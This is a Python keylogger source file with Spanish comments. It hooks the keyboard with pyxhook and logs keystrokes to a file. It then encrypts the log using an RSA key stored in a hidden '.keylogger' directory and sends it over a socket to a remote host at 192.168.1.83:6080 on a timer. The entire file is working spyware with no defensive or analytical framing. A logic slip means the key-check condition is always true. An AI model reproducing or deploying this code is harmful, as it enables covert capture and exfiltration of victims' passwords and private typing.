import os
import pyxhook
import struct
import socket
from threading import Timer
import time
import subprocess
import hashlib

def enviarArchivo(sck: socket.socket, archivo):
    # Obtener el tamaño del archivo a enviar.
    tamArchivo = os.path.getsize(archivo)
    # Informar primero al servidor la cantidad
    # de bytes que serán enviados.
    sck.sendall(struct.pack("<Q", tamArchivo))
    # Enviar el archivo en bloques de 1024 bytes.
    with open(archivo, "rb") as f:
        while read_bytes := f.read(1024):
            sck.sendall(read_bytes)
def crearConexion():
    try:
        with socket.create_connection(("192.168.1.83", 6080)) as conn:
            CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ~/Desktop/.keylogger/public.pem -pubin"
            pipe=subprocess.Popen(CMD, shell=True)
            pipe.wait()
            enviarArchivo(conn, "file2.log")
    except:
        with open(archivo, 'a') as f:
            mensaje ="**** El socket no se puede conectar ****"
            f.write(mensaje)
            f.write('\n')
# Guardamos lo que se va escribiendo antes de presionar espacio o enter
listaCadena =  []

# Obtenemos el archivo
archivo = os.environ.get(
    'pylogger_file',
    os.path.expanduser('file.log')
)
 
# Validamos si existe el archivo
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(archivo)
    except EnvironmentError:
        pass
# Comienza a obtener las teclas
def OnKeyPress(event):
    # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
    if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key:
        with open(archivo, 'a') as f:
            mensaje = "".join(listaCadena)
            f.write(mensaje)
            f.write('\n')
            listaCadena.clear()

        timer = Timer(interval=3, function=crearConexion)
        timer.daemon=True
        timer.start()

    else:
        # Agregamos a la lista la tecla presionada.
        listaCadena.append(event.Key)


# Iniciamos las librerias para leer los datos.
lectura = pyxhook.HookManager()
lectura.KeyDown = OnKeyPress
lectura.HookKeyboard()
try:
    lectura.start()
except KeyboardInterrupt:
    pass
